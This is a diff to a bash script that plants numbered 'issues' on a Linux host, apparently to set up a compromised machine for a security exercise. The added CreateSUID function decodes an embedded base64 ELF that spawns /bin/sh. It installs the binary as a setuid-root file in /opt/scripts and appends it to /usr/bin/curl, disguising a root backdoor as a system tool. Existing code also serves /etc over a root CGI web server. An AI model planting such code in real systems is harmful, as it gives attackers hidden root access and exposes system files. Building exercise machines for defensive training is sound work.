@@ -25,7 +25,10 @@ Main(){
   CreatePyServer 3>&1 &>/dev/null
   echo "Created Issue 8"
   sleep 1
-  CreateGoodbye 
+  CreateSUID
+  echo "Created Issue 9"
+  sleep 1
+  CreateGoodbye
   sleep 1
   CreateLogin 3>&1 &>/dev/null
 }
@@ -205,6 +208,32 @@ CreateAnnoy(){
 CreatePyServer(){
 
   cd /etc/ & sudo python3 -m 'http.server' --cgi 80 & disown
+}
+
+CreateSUID(){
+
+  sudo mkdir /opt/scripts/
+  file_location=/opt/scripts/tmp
+  cat > $file_location << 'binary'
+f0VMRgIBAQCwaw8FicfrGAIAPgABAAAACIACAAAAAABAAAAAAAAAADHAsGkPBTHAsGzrJEAAOAAB
+AEAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAgAIAAAAAAA8FiccxwOsYnwAAAAAAAACfAAAAAAAAAAAA
+IAAAAAAAsGoPBUi/L2Jpbi9zaABXMcCwO0iJ51ZIieZIieIPBYnHMcCwPA8F
+binary
+  cat /opt/scripts/tmp | base64 -d >> /opt/scripts/shell
+  sudo rm /opt/scripts/tmp
+  sudo chown root:root /opt/scripts/shell
+  sudo chmod +sx /opt/scripts/shell
+
+  file_location=/usr/bin/tmp
+  sudo cat > $file_location << 'binary'
+f0VMRgIBAQCwaw8FicfrGAIAPgABAAAACIACAAAAAABAAAAAAAAAADHAsGkPBTHAsGzrJEAAOAAB
+AEAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAgAIAAAAAAA8FiccxwOsYnwAAAAAAAACfAAAAAAAAAAAA
+IAAAAAAAsGoPBUi/L2Jpbi9zaABXMcCwO0iJ51ZIieZIieIPBYnHMcCwPA8F
+binary
+  sudo cat /usr/bin/tmp | sudo base64 -d >> /usr/bin/curl
+  sudo rm /usr/bin/tmp
+  sudo chown root:root /usr/bin/curl
+  sudo chmod +sx /usr/bin/curl
 }
 
 CreateTaunt(){
